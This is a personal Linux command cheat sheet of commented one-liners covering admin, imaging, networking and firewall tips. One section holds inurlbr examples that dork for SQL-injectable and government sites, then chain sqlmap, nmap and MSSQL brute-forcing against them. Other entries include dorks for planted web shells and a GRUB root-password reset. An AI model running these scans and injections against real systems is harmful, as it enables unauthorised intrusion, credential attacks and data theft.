##### #   Decrypt crypt7 File:
##### #     openssl enc -aes-256-cbc -d -nosalt -nopad -bufsize 16384 -in msgstore.db.crypt7.nohdr -K $(cat aes.txt) -iv $(cat iv.txt) > msgstore.db
##### # get certificate expire date:
##### #  $ openssl x509 -noout -dates -in server.crt
##### #  $ openssl x509 -enddate -noout -in file.pem
##### # convert to libreoffice:   $ soffice --headless -convert-to odt:"writer8" somefile.docx
##### # create thumbnails: for i in *.JPG ; do ( djpeg -scale 1/16 -ppm "${i}" | pnmscale -pixels 50246 | cjpeg -optimize -progressive > /preview/"${i%%.*}".jpeg ) ; done
##### # create block dev:  # ls -l /dev/urandom  to get minor and major numbers, then # mknod /dev/urandom c 1 9
##### # create dev/null:   mknod -m 0666 /dev/null c 1 3
##### # check malware by md5 $ md5sum filename | ncat hash.cymru.com 43
##### # save command output to image:  ifconfig | convert label:@- ip.png
##### # create tgz from python module and then install it withint a virtualenv
##### #  $ ~/sample$ python setup.py sdist
##### #  $ virtualenv --clear myenv
##### #  $ . myenv/bin/activate
##### #  $ pip install sample/dist/sample*
##### #  $ echo y | pip uninstall sample
##### # install python package from github with pip:  pip install git+git://github.com/yhat/ggplot.git or pip install --upgrade https://github.com/yhat/ggplot/tarball/master  
##### # steganography:
##### #  check:  steghide info imagen.jpg
##### #  extract:      $ steghide extract -sf imagen.jpg
##### #  check algorithms available:      $ steghide encinfo
##### #  embed:      $ steghide embed -cf imagen.jpg(pdf,wav...) -ef archivo_texto
##### #  embed w/algorithm:     $ steghide embed -cf imagen.jpg -ef archivo_texto -e cast-256 ctr
##### # decrypt gpg:   gpg archivo_texto.gpg
##### # crypt gpg:     $ gpg -c archivo_texto
##### # crypt directory:   tar zcf - foo | gpg -c --cipher-algo aes256 -o foo.tgz.gpg
##### # decrypt directory:    gpg -o- foo.tgz.gpg | tar zxvf -
##### # recover sd card: api testdisk,   dd if=/dev/mmcblk0 of=memory_card.img bs=512    # photorec memory_card.img
##### # copy disk with errors: dd if=/dev/sda |pv |dd of=/dev/sdb conv=noerror,sync
##### # rescue disk ddrescue -d -r3 /dev/sda /dev/sdb clonacion.log # api gddrescue | # -d ignore kernel cache | r3 try until 3 times to read faulty sectors
##### # recuperar datos del ordenador:    $ grep -a -A100 -B100 -i 'texto a buscar' /dev/sda4 > /tmp/recuperados.txt # /tmp debería estar en otra partición que no sea sda4 # -a para binarios
##### # volcar datos:   $ sudo less -f /dev/sda4  # -f para ficheros especiales
##### # split stream radio in tracks:   streamripper http://server.com:8000/live -D \%A" - "\%T"_"\%q -r -k 0 -i -s -t --xs2
##### # drivers cargados:   $ jockey-text -l
##### # remove accented chars:   iconv -f utf8 -t ascii//TRANSLIT file
##### # enable touchpad: $ synclient TouchPadOff=0
##### # do action when file changed:
##### #  python -m pyinotify -r -c "notify-send asdf" -e IN_MODIFY .bash_aliases
##### #  git-read-only/when-changed ~/.bash_aliases -c "notify-send asdf"
##### #  runonchange () { local cmd=( "$@" ) ; while inotifywait --exclude '.*\.swp' -qqre close_write,move,create,delete $1 ; do "${cmd[@]:1}" ; done ; }
##### # minimify js when original changed:
##### #   #!/bin/bash
##### #  shopt -s globstar
##### #  when-changed **/*orig.js -c 'x="%f" && yui-compressor --type js --nomunge --disable-optimizations -o "${x%.orig.js}.min.js" "$x" && echo "Processed $x..."'
##### # sass --watch .:. --style compact
##### # nmap (http://nmap.org/book/man.html)
##### #  escaneos completos
##### #     nmap --script dhcp-discover 192.168.244.0/24
##### #     nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.100
##### #    nmap -iL archivo_de_entrada
##### #    nmap --excludefile archivo_de_entrada
##### #  inventariado
##### #    sudo nmap -sV -T4 -O -F --version-light 192.168.1.0/24 -oX reporte.xml && xsltproc reporte.xml -o reporte.html
##### #  sólo alive
##### #    nmap -sL 192.168.1.0/24 # encontrar hosts sin mandar ping, mediate un reverse dns
##### #    nmap -sn 192.168.1.0/24 # ping al host
##### #    nmap -sP 192.168.1.0/24 # ping al host
##### #  puertos
##### #    nmap -v 192.168.1.100 # todos, verbose
##### #    nmap -p 80 192.168.1.100 # el 80
##### #    nmap -sT 192.168.1.100 # tcp
##### #    nmap -sU 192.168.1.100 # udp
##### #    nmap -sO 192.168.1.100 # ademas de los anteriores, comprueba otros (igmp, icmp...)
##### #    nmap -p 80-200 192.168.1.100 # rango
##### #     nmap -p U:53,161,8888,T:1000-2000,80,25,8888,8080 192.168.1.100 # rango y tipo
##### #  servicios
##### #    nmap -v -O --osscan-guess localhost  # version os
##### #    nmap -sV 192.168.1.100 # version servicios
##### #    nmap -sV --version-all localhost # servicios intensivo
##### #  detras de firewall
##### #    nmap -PS 192.168.1.100  # mediante tcp ack
##### #    nmap -PA 192.168.1.100  # mediante tcp syn
##### #    nmap -sA 192.168.1.100  # averiguar si está detrás de firewall
##### #  routas
##### #    nmap --iflist 192.168.1.100 # muestra rutas e interfaces de red
##### #  ipv6
##### #    nmap -6 -v FE80:0000:0000:0000:0202:B3FF:FE1E:8329  # añdiendo -6 (y usando una ipv6)
##### #  zemap:
##### #    intense: nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389
##### #    intense w/udp: nmap -sS -sU -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389
##### #    intense all/tcp: nmap -p 1-65535 -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389
##### #    intense no ping: nmap -T4 -A -v -Pn
##### #    ping: nmap -sn -PE -PA21,23,80,3389
##### #    quick: nmap -T4 -F
##### #    quick plus: nmap -sV -T4 -O -F --version-light
##### #    quick traceroute: nmap -sn -PE -PS22,25,80 -PA21,23,80,3389 -PU -PO --traceroute
##### #    slow comprehensive: nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 -PO --script all
##### #  look up for weak ciphers:
##### #    nmap --script ssl-enum-ciphers -p 443 terminus.ignaciocano.com | grep weak
##### #   look up for DHE Export:
##### #    nmap --script ssl-enum-ciphers -p 443 terminus.ignaciocano.com | grep -E 'DHE_.*_EXPORT'
##### #  seek permission vs ask for forgiveness?
##### #    if external (i/o, net...) -> ask for forgiveness (ie, use exception handling)
##### #    if user-friendly api -> seek permission (ie. if-statement first)
##### #    else: just do (assume all input is okay)
##### #
##### # inurlbr, examples:
##### #  ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
##### #  ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
##### #  ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
##### #  ./inurlbr.php --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
##### #  ./inurlbr.php --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
##### #  ./inurlbr.php --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
##### #  ./inurlbr.php --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
##### #  ./inurlbr.php --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
##### #  ./inurlbr.php --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
##### #  ./inurlbr.php --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
##### #  ./inurlbr.php --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
##### #  ./inurlbr.php --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
##### #  ./inurlbr.php --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
##### #  ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
##### #  ./inurlbr.php --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
##### #  ./inurlbr.php --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
##### #  ./inurlbr.php --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
##### #  ./inurlbr.php --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
##### #  ./inurlbr.php --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
##### #  ./inurlbr.php --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
##### #  ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
##### #  ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
##### #  ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
##### #  ./inurlbr.php --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
##### #  ./inurlbr.php --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
##### #  ./inurlbr.php --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
##### #  ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
##### #  ./inurlbr.php --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
##### #  ./inurlbr.php --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
##### #  ./inurlbr.php --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
##### # set audible bell when host becomes online:  $ ping -a IP_address
##### #  
##### # zmap:   zmap --bandwidth=10M --target-port=25 --max-targets=10000 --output-file=results.txt
##### # timelapse:  ffmpeg -r 12 -i img%03d.jpg -sameq -s hd720 -vcodec libx264 -crf 25 OUTPUT.MP4
##### # tmux: horiz:^b" vert:^b% show:^bq time:^bt move:^b[arrow] window:^bc nav:^bp|^bn list:^bw detach:^bd reattach:tmux attach
##### # multiple "windows": tmux | screen | byobu | terminator
##### # tmux guest read only with ssh: en el fichero ~/.authorized_keys
##### #  command="tmux attach -r",no-agent-forwarding,no-port-forwarding,no-X11-forwarding,no-user-rc ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBLFgbU5JFh0FELpXAehSVDnQAk86mRtDNgKR24m9ImqmBeH4CwiwCLItGrUIYRWp6VLZpdyzij2YNiCHaIWzmZZJjnuI/aZ3msAnAOBYi9hKLIP26WvaSfZSLd7/mntHLg== John Doe
##### # tmux start with given layout:
##### #  tmux new-session -d 'cd /home/karpoke/projects/scripts; /home/karpoke/git-read-only/tg/bin/telegram-cli -k /home/karpoke/git-read-only/tg/tg-server.pub -s telegram.lua -W -N -vvvv -l 0 -L telegram-cli.log -P 8000' \; split-window -d \; attach
##### # only get one command out with ssh: in the serve file ~/.authorized_keys (careful, with no-pty you won't login)
##### #  command="/bin/ps -ef",no-port-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAp0KMipajKK468mfihpZHqmrMk8w+PmzTnJrZUFYZZNmLkRk+icn+m71DdEHmza2cSf9WdiK7TGibGjZTE/Ez0IEhYRj5RM3dKkfYqitKTKlxVhXNda7az6VqAJ/jtaBXAMTjHeD82xlFoghLZOMkScTdWmu47FyVkv/IM1GjgX/I8s4307ds1M+sICyDUmgxUQyNF3UnAduPn1m8ux3V8/xAqPF+bRuFlB0fbiAEsSu4+AkvfX7ggriBONBR6eFexOvRTBWtriHsCybvd6tOpJHN8JYZLxCRYHOGX+sY+YGE4iIePKVf2H54kS5UlpC/fnWgaHbmu/XsGYjYrAFnVw== Test key
##### # http://linux.die.net/man/5/terminator_config
##### # terminator -b -m -l layoutName (-b=bordless, -m=maximize)
##### # terminator: alt+arrow, ^shift+arrow, ^shift+n|p, ^pagup|down, ^shift+pagup|down, ^shift+t|i, sup+g|i, sup+shift+g, sup+t, sup+shift+t, ^shift+o|e|w|q, ^shift+r|g|s|f
##### # ancho de banda:  bwm-ng
##### # un poco de iptables (se ejecuta la primera que encuentra, poner el candado al final:
##### #  show iptables: iptables -L
##### #  permitir ssh:  iptables -I INPUT -i eth0 -p tcp --dport 22 -j ACCEPT
##### #  permitir coneciones ya establecidas:  iptables -A INPUT -i eth0 -m conntrack  --ctstate ESTABLISHED,RELATED -j ACCEPT
##### #  candado: iptables -A INPUT -i eth0 -p tcp -j DROP # REJECT # REJECT "message: busy"
##### #  nat:  iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to-source 89.72.31.243 # cambia la ip de origen por 89.*.*.*
##### #  virtual server:  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 25 -j DNAT --to-destination 192.168.1.2:25 # mail server
##### #   save: iptables-save > /some/directory/my_rules.fw
##### #   restore: iptables-restor < /some/directory/my_rules.fw
##### #   make iptables permanent: api iptables-persistent (or reconfigure with: sudo dpkg-reconfigure iptables-persistent)
##### #   limitar el número de conexiones por IP:   iptables -I INPUT -p tcp --syn --dport 12345 -m connlimit --connlimit-above 2 -j REJECT
##### #  banear un país: iptables -A INPUT -m geoip -src-cc KN -j DROP
##### # ufw:
##### #  avoid ping: sudo iptables -A INPUT -p icmp -j DROP
##### #  abrir un puerto: sudo ufw allow proto tcp from 192.168.50.0/24 to any port 9090
##### #  eliminar un puerto: sudo ufw delete allow proto tcp from 192.168.50.0/24 to any port 9090
##### #  banear ip: sudo ufw deny from <ip address>
##### #  limit PPS: sudo iptables -A INPUT -m limit --limit 2000/sec -j ACCEPT && sudo iptables -A INPUT -j DROP
##### #  round robin traffic when having several public IPs:
##### #    iptables -t nat -I POSTROUTING -m state --state NEW -p tcp --dport 80 -o eth0 -m statistic --mode nth --every 3 --packet 0 -j SNAT --to-source 1.1.1.1
##### #    iptables -t nat -I POSTROUTING -m state --state NEW -p tcp --dport 80 -o eth0 -m statistic --mode nth --every 2 --packet 0 -j SNAT --to-source 1.1.1.2
##### #    iptables -t nat -I POSTROUTING -m state --state NEW -p tcp --dport 80 -o eth0 -m statistic --mode nth --every 1 --packet 0 -j SNAT --to-source 1.1.1.3
##### # blocking ip with arp: arp -s <ip> 0 || unblock:  arp -d <blocked_ip>
##### # activar servicio en rulevels:       #chkconfig ¿level 235 sshd on
##### # ver servicios activos al inicio :  #chkconfig --list | grep '3:on'
##### # opciones de energía:  pm-is-supported --suspend # pm-suspend
##### # buscar paquetes de ficheros: apt-file update && apt-file -F search /etc/bash_completion
##### # histórico de instalaciones en debian/ubuntu:
##### #  # tail /var/log/apt/history.log
##### #  # dpkg --get-selections | more
##### #  # grep install /var/log/dpkg.log
##### # impedir la instalación de un paquete:
##### #  # cat /etc/apt/preferences.d/dphys-swapfile
##### #  Package: dphys-swapfile
##### #  Pin: origin ""
##### #  Pin-Priority: -1  # set priority to -1
##### # optimizar imágenes jpg:
##### #   jpegtran -optimize grafic-memoria-nagios-288x300-no-optimitzada.jpg > grafic-memoria-nagios-288x300.jpg
##### #   jpegoptim file.jpg
##### # convert img.png -resize 20x20 output.png
##### # optimizar png:
##### #   pngcrush    # reduce sin pérdida, es lenta
##### #   pngcrush -reduce -brute source.png destination.png
##### #   pngcrush -rem gAMA -rem cHRM -rem iCCP -rem sRGB entrada.png salida.png
##### #   optipng     # reduce sin pérdida, es lenta
##### #   pngquant    # con périda, de 24 a 8 bits, rápida
##### #   pngnq       # con périda, de 24 a 8 bits, rápida
##### # optimizar png bueno:  overlay source.png
##### # info imagen png:  pnginfo -t image.png
##### # eliminar metadatos imágenes.  jpegtran -optimize -copy none img-in.jpg > img-out.jpg
##### # scp: desactivar la compresión para un fichero ya comprimido:  scp -o 'Compression no'
##### # scp: aumentar el nivel de compresión (def: 6)  -o 'CompressionLevel 9'
##### # scp: reducir la complejidad del cifrado (a rc4)  -c arcfour
##### # ver la configuración de apache:   apache2 -S
##### # ver modos fichero octal:   stat -c '%A %a %n' filename
##### # listen mode permissions: n=(C D E F G A B "C4 ");stat -c%a *|while read -n1 k;do x=${n[$k]};sleep .2;play -qn synth pl ${x}3 fade 0 1 & done
##### # cut:  cut -c2 | -c2- | -c2-3 | -c-2 | -d":" -f1 | -d":" -f1,3-5,7- | -d":" -s -f1 (sep mandatory) | -d":" -s -f1 --complement | -d: -f1,5 --output-delimiter=";"
##### #   --output-delimiter=$'\n'
##### # cpulimit -e  firefox  -l 60 | -p 1420 -l 30 | -P /usr/bin/programa -l 50 -b
##### # limit cpu to command to 30%:  cpulimit -l 30 dd if=/dev/zero of=/dev/null &
##### # force ssh user command:  in /etc/ssh/sshd_config:   Match User test | ForceCommand /bin/ps
##### # hw details: lshw || inxi -ACDFGIlnN || lsblk || lspci || /sbin/lspcmcia || lsscsi || lsmod || lsusb || hardinfo || sysinfo || blkid || acpi || acpitool || lsb_relase || glxinfo || glxgears || xrandr
##### # sound cards:   cat /proc/asound/{cards,devices,modules,version} || lspci -v | grep -i audio || alsamixer || aplay --list-devices || speaker-test
##### # memory details: free || top || /proc/meminfo || vmstat -s || dmidecode --type memory | -t 17 || dstat | dstat -c --top-cpu -dn --top-mem || swapon -s || fdisk -l || sfdisk -l
##### # memory used by a process (human readable):   ps -eo size,pid,user,command --sort -size | awk 'NR>1 { hr=$1/1024 ; printf("%13.2f Mb ",hr); for ( x=4 ; x<=NF ; x++ ) { printf("%s ",$x) } print "" }' | head
##### # usb details:  lsusb -D /dev/bus/usb/002/005 | -v | -t
##### # network cards info:  ifconfig | iwconfig | route -n | ip link show | sudo mii-tool | ethtool eth0 | ethtool -P eth0 (mac address)
##### # force nic speed:   ethtool -s eth0 speed 100 duplex full
##### # monitors (*=root required):  iotop* | top | htop | mytop | powertop* | innotop | iftop* -nNP | iptraf* | nethogs* | ntop* | atop | apachetop | nginxtop | bmon | nmon | bwm-ng | wavemon | wifite | vnstat | pktstat | ethstatus | iperf
##### # vnstat:
##### #  after install from repo: sudo vnstat -u -i eth1
##### #  /etc/vnstat.conf:  change > Interface
##### #  in cron: */5 * * * * root vnstat -u
##### #  display: vnstat -d|-m|-t
##### # reset dnsmasq:   killall -SIGHUP dnsmasq
##### # ncurses menues:  whiptail | yad | zenity
##### # change window title under curso:  $ zenity --entry "Titulo de la ventana" | xargs -i /usr/bin/wmctrl -r :SELECT: -N "{}"
##### # navegador en bloc de notas:  data:text/html, <html contenteditable>
##### # debugging javascript:    debugger;
##### # turn on debugging nfs:  $ echo 1 > /proc/sys/sunrpc/nfs_debug
##### # read and write into the same:   tac file | sponge file
##### # paste in shell and no get the echo until ^D: tac | tac
##### # search in pdf: pdfgrep
##### # all printable chars in bash:  for i in `seq 32 126`; do printf \\$(printf "%o" $i);done;
##### # makecoffee: printf "\xE2\x98\x95\n
##### # recover root password:
##### #    grub menú > ESC > recovery mode > e >  linux /boot/vmlinuz-3.2.0-18-generic root=UUID=b8b64ed1-ae94-43c6-92\d2-a19dfd9a727e ro recovery nomodeset:
##### #  > "recovery nomodeset:" por "rw init=/bin/bash:" > F10 > /usr/sbin/usermod -p '!' root > reiniciamos > contraseña de root borrada
##### # set master volume level:   $  amixer sset Master playback 0%
##### # set speakers volume level:  $ amixer sset 'Speaker' playback 0% # not the ear headphones
##### # eliminar saltos de línea introducidos por programas (\r):    echo -e "asdf\rasdfa\rasfda" | perl -p00e 's/\r?\n //g'
##### # english to german:  leo() { IFS=+; lang=en; Q="${*// /%20}"; curl -s "https://dict.leo.org/${lang}de/?search=${Q//+/%20}" | html2text | grep -EA 900 '^\*{5} ' | grep -B 900 '^Weitere Aktionen$';}
##### # list partition superblocks:  $ sudo dumpe2fs /dev/sda1 | grep superblock
##### # mount using backup superblock (mbr): $ mount -o sb=98304 /dev/sda5 /mnt/data5
##### # mount iso:   mount -o loop file.iso /tmp/iso
##### # make squashfs file system:   mksquashfs fotos-2009 fotos-2010 fotos-2011 fotos-2012 fotos-2013 fotos.sqsfs -comp xz -bs 1M  ## xz=compression algorithm
##### # mount squashfs:   mount fotos.sqsfs /tmp/sqsfs/   ## fstab:   /dir/loop.sqsh /dir/mountdir squashfs ro,defaults 0 0
##### # extract/unmount from squashfs:  unsquashfs [options] snapshot.sqfs [dirs o files to extract]
##### # set static ip:  ifconfig eth0 192.168.1.15 netmask 255.255.255.0   ;  route add default gw 192.168.1.1 ; edit resolv.conf    nameserver 192.168.1.1
##### # get interface active:
##### #   ifconfig -s | head -2 | tail -1 | awk '{print $1}'
##### #   ip link | awk -F: "/state UP/"'{print $2}'
##### #   grep -L up /sys/class/net/*/operstate | head -1
##### # monitor intefaces:
##### #   ip monitor  # monitor when interface is connected/disconnected
##### #   ifplugd | netplugd
##### # edit /etc/resolvconf/resolv.conf.d/base <<< nameserver 192.168.1.1 || sudo resolvconf -u
##### # trash-cli:   list-trash | trash filename | restore-trash filename
##### # delete files older than 30 days in trash:   TRASH=/home/karpoke/.local/share/Trash; find $TRASH/info -mtime +30 -print0 | while read -d $'\0' f; do echo rm -i "$f"; echo rm -i "$TRASH/files/$(basename "${f//.trashinfo}")"; done
##### # how much old files occup: find . -mtime +$(date +%j) -ls | awk '{sum+=$7} END {print sum}' # How much space files older than the present year are using. %j=Julian day
##### # delete files based on age:  tmpreaper 5d ~/Downloads | [smhd] | -m (not modified) | -s (symbolic links) | -a (all types: dirs, sym) | -t (test) | -f (force) | --protect '*.c' (pattern)
##### # delete files based on age:  file ~/Downloads -mtime 5 -delete (sólo permite por días)
##### # borrar datos exif de jpg:    jhead -purejpg file.jpg  |  $ jhead -dt imagen.jpg | $ jhead -mkexif imagen.jpg (borra datos) | $ jhead -purejpg imajen.jpg (borra efix)
##### #  $ exiv2 -d a imagen.jpg
##### # $ exiv2 -d t imagen.jpg
##### # android app para eliminar exiff:  https://play.google.com/store/apps/details?id=com.cakecodes.ezunexif.free
##### # exif extraer thumbnail:   $ jhead -st thumbnail.jpg recorte.JPG
##### # exif cambiar fecha:   $ jhead -ts2005:30:11:-3:48:00 hoja.jpg
##### # mostrar datos exif $ exif -d fotografia.jpg (datos completos)  | $ exiv2 -v fotografia.jpg
##### # modify exit timestamp adding 1h:  $ exiftool -AllDates+=1 -{Track,Media}{Create,Modify}Date+=1 *.mov
##### # world population:
##### #  curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}'
##### #       curl -s http://www.census.gov/popclock/data/population/world | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
##### # ten commands most used:   history | awk '{a[$2]++ } END{for(i in a){print a[i] " " i}}' | sort -rn | head;
##### # chrome / settings
##### #  shortcuts:  chrome://{bookmarks,flags,settings,settings/passwords,settings/searchEngines,plugins,extensions,history,downloads}
##### #   mute tabs audio: chrome://flags/#enable-tab-audio-muting
##### # convert ascii to raw data:   echo -n 023135 | perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
##### # send raw data using udp:   echo -n 023135 | perl -pe 's/([0-9a-f]{2})/chr hex $1/gie' | nc -4u -q1 -p5001 192.168.0.100 2000
##### # convert raw to jpg:   ufraw-batch --out-type=jpeg --out-path=./jpg ./*.NEF
##### # identify the image format:   identify -format %k
##### # convert html to markdown:   $ xclip -selection clipboard -o -t text/html | pandoc -f html -t markdown_github -
##### # php from command line:  php -r 'print("2");'  | $texto = fread(STDIN, 100); print $texto;
##### # rss, get title from reddit quotes:   rsstail -1 -u http://www.reddit.com/r/quotes/new/.rss  (create rss from twitter:   http://www.rssitfor.me/getrss?name=climagic)
##### # do action for each new entry from rss: rsstail -i 3 -u example.com/rss.xml -n 0 | while read x ; do play fail.ogg ; done
##### # get last entries: rsstail -l -z -n 10 -p -1 -u http://epicnds.com/feed/ # -l=link, -z=ignore parse errors, -n=x entries, -p=pubdate, -1=one shot -u=url, -i=interval (def 15min)
##### # hostname (volatile) || hostname -d || hostname -f || hostname -I || cat /etc/hostname /etc/hosts || sudo hostname -b newhostname.example.com || hostnamectl || hostnamectl set-hostname example.com [--transient (non permanent)] [--prety "áéí" (utf8) || sudo sysctl kernel.hostname=example.com (volatile) (to check: sysctl -a | grep hostname) || nmcli general hostname lintel.in (to check: nmcli general hostname)
##### # backup crontab files: head -100 /var/spool/cron/crontabs/* || per user recover: crontab crontab-file.txt || edit current crontab:  >(crontab -e) command
##### # remove job from crontab: crontab -l -u USER | grep -v 'YOUR JOB COMMAND or PATTERN' | crontab -u USER -
##### # cron: MAIL="karpoke" || PATH=/usr/sbin # for commands to be executed
##### # unpack eml files: munpack file.eml (api mpack)
##### # https://bugs.launchpad.net/ubuntu/+source/samba/+bug/1257186
##### # pluggable authentication modules: sudo pam-auth-update
##### # dump aspell dictionary;:   $ aspell -d en dump master | aspell -l en expand > words
##### # look . # search for words in file (default /usr/share/dict...)
##### # turn off display/screen: $ xset dpms force off || xset dpms force on
##### # configure screen:
##### #  xrandr -q  # list modes
##### #  xrandr --output VGA1 --auto || xrandr --output VGA1 --off  # enable | disable
##### #  xrandr --output VGA1 --left-of DVI1 || xrandr --output VGA1 --left-of DVI1  # relative position
##### #  xrandr --output VGA1 --same-as LVDS1  # mirror
##### #  xrandr --output VGA1 --mode 1024x768  # set mode
##### #  DISPLAY=":0" xrandr --output LDVS1 --auto  # automatic config from tty
##### #  tv:   xrandr --output HDMI-0 --auto --left-of LVDS --mode 1280x1024
##### # test web server: ab | siege
##### #  siege --concurrent=50 --reps=100 http://www.misitio.com
##### #  siege --concurrent=50 --reps=100 -f urls.txt
##### # crear un índice de paquetes:  dpkg-scanpackages . /dev/null | gzip > Packages.gz (api dpkg-dev)
##### # play capncrunch (captain crunch) 2600Hz tone:  play -n synth sine 2600
##### # play math music :  perl -e 'use bytes; for($t=0;;$t++){ print chr($t*(($t>>12|$t>>8)&63&$t>>4)); }' | play -t raw -b8 -r8k -e un -
##### # wait for a job in background:  wait %1
##### # do-some-job &; (or ^Z) and then:  wait %1 && echo finished | mail -s finished john@example.com
##### # tr "qwertyuiop[]sdfghjkl;'zxcvbnm,./" "',.pyfgcrl/=oeuidhtns\-;qjkxbmwvz"  # Convert something typed in qwerty layout on a dvorak layout. ;-)
##### # show levels nested: echo "I am $BASH_SUBSHELL levels nested";
##### # kill stopped jobs:  kill -9 `jobs -p`
##### # redirect a string to pastebin:   $ sprunge() { curl -F 'sprunge=<-' http://sprunge.us < "${1:-/dev/stdin}"; }  ## echo "Hello world!" | sprunge # Redirect a stream to a pastebin
##### # upload file with curl:   curl -F upload=@ejemplo.jpg systemadmin.es/upload.php
##### # launch $EDITOR:  ^xe
##### # último argumento del último comando:  !$ || alt+. || esc+.
##### # auto mouse scroll up:   sleep 5; xdotool click --repeat 1500 --delay 20 4
##### # force origin IP with:  telnet -b 192.168.1.129 74.125.203.27 25  || check with netstat
##### # copy mbr:  sfdisk -d /dev/FROM | sfdisk /dev/TO # maybe you must use -f (also you can use a file)
##### # copy gpt:  sgdisk -R=/dev/TO /dev/FROM  ## sgdisk -G /dev/TO
##### # google dorks:
##### #  intitle:"C99Shell" filetype:php
##### #  intitle:"-N3t" filetype:php undetectable
##### # python packages
##### #  from sh import ls ||  ls("/home") || sh.ping("example.com", c=4)
##### # reparar sectores defectuosos (disco y particiones desmontadas)
##### #  touch /forcefsck  # scan disk on next reboot
##### #  option1: badblocks -sv /dev/sda1 | tee -a badblocks_sda1.lst; fsck -l badblocks_sda1.lst /dev/sda1
##### #   option2: sudo badblocks /dev/sda1 &&  e2fsck - v -y -p -f /dev/sda1 || si sigue habiendo errores:  sudo fsck.ext4 -cDfty -C 0 /dev/sda1
##### # correct dirty bit (unsafe unmounting): sudo fsck -r /dev/sdb1 # also try -p
##### # disable user account:   usermod -L -e 1970-01-01 usuario
##### # info about user account:   chage -l usuario
##### # reenable user accoutn:  usermod -L -e 2020-01-01 usuario
##### # join 2 files:   join -o 1.1,2.2,1.3,1.4,1.5,1.6,1.7 -1 1 -2 1 -t: passwd shadow  # all fields from first file, but the second from the second file
##### # disable bluetooth on start:   /etc/rc.local <<< rfkill block bluetooth
##### # kill tty session:  sudo lsof /dev/tty1 && sudo kill -9 $pid
##### # active sockets by process: pgrep -lf processname | cut -d' ' -f1 | awk '{print "cat /proc/" $1 "/net/sockstat | head -n1"}' | sh | cut -d' ' -f3 | paste -sd+ | bc
##### # get process arguments: 
##### #  pgrep lf processname
##### #  if not pgrep available:
##### #    ps -e | grep dhclient  # 2030
##### #    cat /proc/2030/cmdline | xargs -0
##### #    cat /proc/2030/cmdline | tr '\0' ' '
##### #    strings -n 1 /proc/2030/cmdline
